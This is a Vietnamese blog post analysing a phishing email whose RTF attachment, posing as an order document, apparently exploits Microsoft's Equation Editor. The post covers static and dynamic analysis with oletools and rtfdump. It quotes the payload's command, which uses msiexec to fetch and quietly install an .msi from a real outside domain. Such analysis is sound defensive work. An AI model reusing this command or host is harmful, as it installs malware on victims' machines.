---
title: "Phân tích sơ bộ một email mã độc"
author: "F4c3l3ss_"
date: 2020-04-29
tags: ["malware","Research"]
categories: [Research, Malware]
---

Ngày đẹp trời nắng chói chang khắp Sài Gòn vừa nhộn nhịp trở lại sau 2 tuần tự cách ly, đang nhâm nhi 1 ly the coffee house và thưởng thức 1 quyển sách thì mình nhận được mẫu email mã độc forward từ một người bạn. Theo thói quen mình liền mở lên phân nó thử xem sao.
![IMG](/assets/img/blog/0_coffee_house.jpg)

## Phân tích tĩnh

Sau khi tải file .EML, vì an toàn nên thay vì dùng những phần mềm chuyên đọc và mở mail như Outlook, Mail,... nên mình dùng những phần mềm đọc văn bản như Notepad++ hay sublime text mở file và nắm nội dung sơ bộ của email này. 

![IMG](/assets/img/blog/1_static_notepad.jpg)

Loại bỏ nội dung của email, ta chú rằng có một tệp tin là "RFQ NEW ORDER.doc" đính kèm.
Để chắc rằng file đính kèm có phải là 1 file .doc hay không hay đó là 1 file exe, mình tiến hành copy chuỗi đầu tiên trong đoạn base64 để có được "Magic bytes" của file đính kèm từ đó xác nhận đây là file gì.

![IMG](/assets/img/blog/3_decode_base64.jpg)

![IMG](/assets/img/blog/4_magic_bytes.jpg)

"Magic bytes" cho chúng ta biết đó là file RTF(Rich Text Format) một dạng file văn bản phát triển bởi Microsoft và có thể đọc bởi bất kỳ các trình soạn thảo văn bản. Nhưng mối nguy hiểm của định dạng file RTF là nó cho phép một tập tin khác nhúng vào chính nó và sau đó thực thi.
Sau khi xác nhận đó là file RTF, mình tiến hành xuất file đính kèm bằng “mpack” trên Ubuntu.

![IMG](/assets/img/blog/5_extract.jpg)

Sử dụng bộ công cụ Ole tools để phân tích tập tin RTF kính đèm.

![IMG](/assets/img/blog/6_ole.jpg)

Ta thấy rằng rtfobj phát hiện ra 1 file nhúng bên trong file RTF, và có thể liên quan tới CVE-2017-1182 hoặc CVE-2018-0802.
Để xác định rõ thêm các file nhúng bên trong file RTF, ta sử dụng rtfdump
 

![IMG](/assets/img/blog/7_rtfdump.jpg)

Chúng ta tiến hành dump các file này ra, để ý  thì MD5 của obj thứ 171 và 172 là giống nhau vậy 2 file này là giống nhau nên chỉ cần dump 1 file để phân tích.
 

![IMG](/assets/img/blog/8_dumpfiles.jpg)

![IMG](/assets/img/blog/9_command.jpg)

Như hình trên ta có thể thấy khi mở mẫu, thì sẽ thực thi một command đó là:

`Cmd.exe & /C CD C: & msiexec.exe /I https://www.soygorrion.com.ar/ii/solstraalehi.msi/quiet`

Câu lệnh này tương ứng với windows sẽ cái đặt file solstraalehi.msi sau khi download và chạy ẩn tiến trình, điều này sẽ làm user không biết được rằng máy mình đang bị cài đặt một chương trình lạ vào máy. Tuy nhiên cũng không loại trừ khả năng đây là attacker cố ý làm rõ.
## Phân tích động
Tiến hành phân tích động, sau khi mở file Microsoft Word sẽ gọi tiến trình EQNEDT32.exe để xử lý các OLE của file RTF, ta thấy rằng tiến trình EQNEDT32.exe sẽ thực thi câu lệnh và cài đặt gói 

 

![IMG](/assets/img/blog/10_process.jpg)

![IMG](/assets/img/blog/11_process.jpg)

![IMG](/assets/img/blog/12_properties.jpg)

Vậy sau khi thực thi, tiến trình sẽ thực hiện cài đặt gói đã được định sẵn.
Tuy nhiên lúc thực hiện bài phân tích, domain này đã gỡ bỏ file .msi của mã độc, từ đó không thể tải về file này để phân tích các bước tiếp theo mà mã độc sẽ thực hiện.

Happy holidays!

